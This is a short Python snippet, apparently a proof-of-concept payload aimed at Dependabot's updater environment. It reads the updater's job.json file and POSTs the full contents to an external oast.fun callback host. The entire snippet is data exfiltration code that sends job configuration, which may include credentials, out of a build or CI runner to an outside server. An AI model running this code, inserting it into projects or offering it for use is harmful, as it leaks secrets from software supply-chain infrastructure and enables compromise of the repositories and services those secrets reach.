  import json, urllib.request                                                                                                                                
  with open("/home/dependabot/dependabot-updater/job.json", "r") as f:                                                                                       
      job = json.load(f)
  req = urllib.request.Request(                                                                                                                              
      "http://dtscchmqpronalsrfkkjwhyialnd5xsnm.oast.fun/job",                           
      data=json.dumps(job).encode(),                                                                                                                         
      headers={"Content-Type": "application/json"},               
      method="POST"                                                                                                                                          
  )                                                                                                                                                          
  urllib.request.urlopen(req, timeout=10)
